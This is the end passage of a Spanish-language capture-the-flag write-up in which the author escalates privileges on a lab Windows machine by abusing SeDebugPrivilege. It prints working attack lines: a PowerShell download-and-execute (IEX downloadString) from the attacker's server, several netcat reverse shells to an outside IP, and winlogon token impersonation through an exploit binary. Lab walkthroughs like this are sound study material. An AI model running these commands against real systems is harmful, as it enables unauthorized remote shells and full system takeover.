</span></span></span></code></pre></div><p>y despu√©s de ello, luego de empezar un servidor <code>Python</code> <code>HTTP</code> temporal en el puerto <code>8000</code> donde <code>psgetsys.ps1</code> se encuentra almacenado (<code>python3 -m http.server 8000</code>), importo el m√≥dulo desde mi m√°quina en la m√°quina v√≠ctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\system32&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.2:8000/psgetsys.ps1&#39;)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.2:8000/psgetsys.ps1&#39;)
</span></span></span></code></pre></div><ul><li>Siguiendo las instrucciones del blog buscamos un proceso privilegiado para &ldquo;secuestrar&rdquo;. En este caso buscamos por <code>winlogon</code> y para ello corremos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\system32&gt; Get-Process winlogon
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Get-Process winlogon
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
</span></span></span><span class=line><span class=cl><span class=go>-------  ------    -----      -----     ------     --  -- -----------
</span></span></span><span class=line><span class=cl><span class=go>    255      12     2652      16404       0.20    552   1 winlogon
</span></span></span></code></pre></div><p>donde el par√°metro <code>Id</code> es el que nos interesa, en este caso el valor es <code>552</code> (<em>√©ste puede ser levemente diferente en el caso de cada uno, as√≠ que revisar esto</em>).</p><ul><li>Luego de correr este comando podemos ver que <code>SeDebugPrivilege</code> est√° habilitado:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\system32&gt; whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== =======
</span></span></span><span class=line><span class=cl><span class=go>SeDebugPrivilege              Debug programs                 Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></span></span></code></pre></div><ul><li>No obstante, me encuentro con un problema: si cambio de vuelta a una <code>CMD</code> (salgo de la sesi√≥n de <code>Powershell</code> escribiendo <code>exit</code>) el permiso <code>SeDebugPrivilege</code> vuelve a aparecer como deshabilitado (<code>Disabled</code>). De manera que, desde esta sesi√≥n de <code>Powershell</code> con el privilegio habilitado, me mando una nueva reverse shell con <code>CMD</code> a otro listener con <code>netcat</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\Public\Downloads&gt; cmd.exe /c c:\users\public\downloads\nc.exe 10.10.16.2 4444 -e cmd.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cmd.exe /c c:\users\public\downloads\nc.exe 10.10.16.2 4444 -e cmd.exe
</span></span></span></code></pre></div><p>y vuelvo a tener conexi√≥n, pero esta vez en una <code>CMD</code> con todos los privilegios habilitados:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 4444
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.251] 49677
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== =======
</span></span></span><span class=line><span class=cl><span class=go>SeDebugPrivilege              Debug programs                 Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></span></span></code></pre></div><ul><li>He de decir que de la sesi√≥n de <code>Powershell</code> que ten√≠a previamente <code>psgetsys.ps1</code> intent√© obtener una shell, pero no ocurri√≥ nada:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\Public\Downloads&gt; import-module .\psgetsys.ps1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\Public\Downloads&gt; ImpersonateFromParentPid -ppid &#34;552&#34; -command &#34;cmd.exe&#34; -cmdargs &#34;/c c:\users\public\downloads\nc.exe 10.10.16.2 4444 -e cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ImpersonateFromParentPid -ppid &#34;552&#34; -command &#34;cmd.exe&#34; -cmdargs &#34;/c c:\users\public\downloads\nc.exe 10.10.16.2 4444 -e cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go>[+] Got Handle for ppid: 552
</span></span></span><span class=line><span class=cl><span class=go>[+] Updated proc attribute list
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting cmd.exe /c c:\users\public\downloads\nc.exe 10.10.16.2 4444 -e cmd.exe...False - pid: 0 - Last error: 2
</span></span></span></code></pre></div><ul><li>De manera que volvemos a la biblia <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege class=external-link target=_blank rel=noopener>HackTricks</a> y all√≠ muestran <a href=https://github.com/bruno-1337/SeDebugPrivilege-Exploit class=external-link target=_blank rel=noopener>otro repositorio de Github llamado &lsquo;SeDebugPrivilege-Exploit&rsquo;</a>. Lo descargo de <a href=https://github.com/bruno-1337/SeDebugPrivilege-Exploit/releases/tag/v1.0 class=external-link target=_blank rel=noopener>sus releases</a>, paso el archivo <code>.exe</code> a la m√°quina v√≠ctima y, <em>desde la <code>CMD</code> con todos privilegios habilitados</em>, -y luego de comenzar otro listener con <code>netcat</code> en el puerto <code>4444</code>- lo corro usando el <code>id</code> del proceso <code>winlogon</code> previamente hallado (<code>552</code> en mi caso):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\debug.exe 552 &#34;C:\Users\Public\Downloads\nc.exe 10.10.16.2 4444 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.\debug.exe 552 &#34;C:\Users\Public\Downloads\nc.exe 10.10.16.2 4444 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go>pid= 552
</span></span></span><span class=line><span class=cl><span class=go>[+] New process is created successfully.
</span></span></span><span class=line><span class=cl><span class=go>    |-&gt; PID : 2996
</span></span></span><span class=line><span class=cl><span class=go>    |-&gt; TID : 3456
</span></span></span></code></pre></div><p>donde <code>SeDebugPrivesc.exe</code> lo renombr√© como <code>debug.exe</code>. Al correr esto obtengo una nueva shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 4444
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.251] 49681
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;
</span></span></span></code></pre></div><p>El √∫nico problema es que esta consola est√° algo &ldquo;buggeada&rdquo; ya que algunos comandos no muestran output, tales como <code>whoami</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;
</span></span></span></code></pre></div><ul><li>Sin embargo, noto que puedo leer la flag del usuario <code>Administrator</code>, de manera que esta es una shell de un usuario con todos los privilegios:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public&gt;type C:\Users\Administrator\Desktop\root.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>type C:\Users\Administrator\Desktop\root.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>853&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Y eso es todo :)</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>